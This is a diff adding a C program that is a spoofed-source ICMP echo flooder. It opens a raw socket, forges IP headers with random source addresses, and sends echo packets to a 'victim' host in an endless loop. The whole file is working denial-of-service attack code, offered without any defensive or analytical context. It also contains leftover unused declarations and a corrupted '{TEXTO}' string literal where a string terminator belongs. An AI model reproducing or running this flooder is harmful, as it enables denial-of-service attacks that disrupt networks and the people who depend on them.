@@ -1,0 +1,162 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <netinet/ip_icmp.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <string.h>
+#include <netinet/ip.h>
+#define handle(i) htons(i)
+#define cicmp 32
+#define aicmp() (a_flags & cicmp)
+#define sending_p() if (sendto(rawsock,&packet,(sizeof packet),0,(struct sockaddr *)&victim,sizeof victim) < 0) {\
+perror("sendto");\
+exit(-1);\
+}
+struct sockaddr_in victim;
+u_long change(const char *host);
+static void inject_iphdr(struct ip *ip, u_char p, u_char len);
+char *class2ip(const char *class);
+static void send_icmp(u_char garbage);
+char *get_plain(const char *crypt_file, const char *xor_data_key);
+static void usage(const char *argv0);
+u_long dstaddr;
+u_short dst_sp, dst_ep, src_sp, src_ep;
+char *src_class, *dst_class;
+int a_flags, rawsock;
+struct {
+int a;
+int b;
+void (*f)(u_char);
+} a_list[] = {
+{ cicmp, ICMP_ECHO, send_icmp },
+{ 0, 0, (void *)NULL },
+};
+int
+main(int argc, char *argv[])
+{
+int n, i, on = 1;
+int b_link;
+#ifdef F_PASS
+struct stat sb;
+#endif
+unsigned int until;
+a_flags = dstaddr = i = 0;
+dst_sp = dst_ep = src_sp = src_ep = 0;
+until = b_link = -1;
+src_class = dst_class = NULL;
+while ( (n = getopt(argc, argv, "Is:h:")) != -1) {
+char *p;
+switch (n) {
+case 'I':
+a_flags |= cicmp;
+break;
+case 'h':
+dstaddr = change(optarg);
+break;
+default:
+usage(argv[0]);
+break;
+}
+}
+if ( (!dstaddr && !i) ||
+(dstaddr && i) ||
+( !aicmp()) ||
+(src_sp != 0 && src_sp > src_ep) ||
+(dst_sp != 0 && dst_sp > dst_ep))
+usage(argv[0]);
+if ( (rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+perror("socket");
+exit(-1);
+}
+for (n = 0; ; ) {
+if (b_link != -1 && random() % 100 +1 > b_link) {
+if (random() % 200 +1 > 199)
+usleep(1);
+continue;
+}
+for (i = 0; a_list[i].f != NULL; ++i) {
+if (a_list[i].a & a_flags)
+a_list[i].f(a_list[i].b);
+}
+if (n++ == 100) {
+n = 0;
+}
+}
+exit(0);
+}
+u_long change(const char *host)
+{
+struct hostent *hp;
+
+if ( (hp = gethostbyname(host)) == NULL) {
+perror("gethostbyname");
+exit(-1);
+}
+return *(u_long *)hp->h_addr;
+}
+#define RANDOM() (int) random() % 255 +1
+char *
+class2ip(const char *class)
+{
+static char ip[16];
+int i, j;
+
+for (i = 0, j = 0; class[i] != '{TEXTO}'; ++i)
+if (class[i] == '.')
+++j;
+switch (j) {
+case 0:
+sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM());
+break;
+case 1:
+sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM());
+break;
+case 2:
+sprintf(ip, "%s.%d", class, RANDOM());
+break;
+default: strncpy(ip, class, 16);
+break;
+}
+return ip;
+}
+static void
+inject_iphdr(struct ip *ip, u_char p, u_char len)
+{
+ip->ip_hl = 5;
+ip->ip_v = 4;
+ip->ip_p = p;
+ip->ip_tos = 0; 
+ip->ip_id = random();
+ip->ip_len = len;
+ip->ip_off = 0;
+ip->ip_ttl = 255;
+ip->ip_dst.s_addr = dst_class != NULL ?
+inet_addr(class2ip(dst_class)) :
+dstaddr;
+ip->ip_src.s_addr = src_class != NULL ?
+inet_addr(class2ip(src_class)) :
+random();
+victim.sin_addr.s_addr = ip->ip_dst.s_addr;
+}
+
+static void
+send_icmp(u_char gargabe)
+{
+struct packet {
+struct ip ip;
+struct icmp icmp;
+} packet;
+memset(&packet, 0, sizeof packet);
+inject_iphdr(&packet.ip, IPPROTO_ICMP, handle(sizeof packet));
+packet.icmp.icmp_type = ICMP_ECHO;
+packet.icmp.icmp_code = 0;
+packet.icmp.icmp_cksum = htons( ~(ICMP_ECHO << 8));
+sending_p();
+}
+static void
+usage(const char *argv0)
+{
+printf("-I -h IP\n");
+exit(-1);
+}
